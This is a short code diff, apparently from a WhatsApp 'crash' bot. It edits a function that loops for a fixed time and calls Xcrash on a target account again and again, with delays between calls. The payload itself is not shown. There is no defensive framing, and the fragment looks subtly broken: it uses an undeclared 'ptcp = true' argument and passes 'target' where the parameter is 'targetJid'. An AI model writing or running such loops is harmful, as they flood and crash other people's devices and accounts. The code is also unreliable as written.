@@ -2174,7 +2174,7 @@ async function S7LOVESYUILIKES7(sock, targetJid) {
   const startTime = Date.now();
 
   while (Date.now() - startTime < ONE_LOVE) {
-    await Xcrash(sock, target);
+    Xcrash(sock, target, ptcp = true)
     await delay(LOVE_SEC);
   }
 }
